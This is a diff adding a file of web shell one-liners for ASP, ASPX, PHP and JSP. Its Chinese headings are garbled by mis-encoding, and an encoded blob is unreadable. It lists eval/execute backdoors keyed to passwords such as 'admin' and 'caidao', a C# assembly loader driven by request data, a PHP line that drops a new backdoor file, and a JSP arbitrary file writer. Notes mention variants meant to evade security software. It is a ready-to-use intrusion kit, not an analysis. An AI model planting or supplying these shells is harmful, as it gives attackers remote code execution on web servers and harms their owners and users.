@@ -1,0 +1,45 @@
+ASPÒ»¾ä»°£º
+<%execute(request("admin"))%>
+1":eval request("a")'
+"%><%eval request("Skull.")%><%'" 
+
+<?php @eval($_POST['Skull.']);?>
+Á¬½Ó£ºhttp://127.0.0.1/shell.php?ts7=assert
+
+<%Y=request("x")%> <%execute(Y)%>  ÃÜÂë x
+
+<%eval request("skull")%>
+ 
+¼ÓÃÜ ©à°YÎÛ „Ÿ¨”³¬›¡Å¡Ô©Í÷   ÃÜÂë a
+
+ASPXÒ»¾ä»°£º
+<%@ Page Language="Jscript"%><%eval(Request.Item["cai1024"],"unsafe");%>
+
+Í»ÆÆ°²È«¹· 
+<%@ Page Language="C#" ValidateRequest="false" %>
+
+<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies["Skull."].Value))).CreateInstance("c", true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null, null); } catch { }%>
+
+
+PHPÒ»¾ä»°£º
+<?php eval($_POST[caicai]);?>
+=======================================================
+php zend¼ÓÃÜÃâÉ±µÄÒ»¾ä»° ÃÜÂëÎª caidao
+
+Zend 2004072203 3 148 373 x?
+?ÕêAùy
+¾‰yy©•?QÇeldjdjf,JÀÕJinn¥^bJJ?‡ªc 5Ô@\8‡ÂÝÎM
+P¨áP?TÉM?,T?C|€p?ix¡Œ¢Ö?913%1ªJ?2W{ÐH†ÊÆa-c¡’¢p??f¨ü<^€F?N ?#?
+
+===========================================================================
+<?fputs(fopen("test.php","w"),'<?php eval($_POST["cmd"]);?>');?>
+===============================================================================
+
+
+×¢£ºÒÔÉÏÒ»¾ä»°Ä¾ÂíµÄÃÜÂë¾ùÎª£ºadmin
+
+
+JSPÒ»¾ä»°£º//´ËÒ»¾ä»°ÎÒÓÃ²Ëµ¶Ã»Á¬½Ó³É¹¦£¬¿ÉÒÔÓÃJSP¿Í»§¶Ë½øÐÐÁ¬½Ó(ÔÚJSPÂíÀà)
+
+<%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%>
+
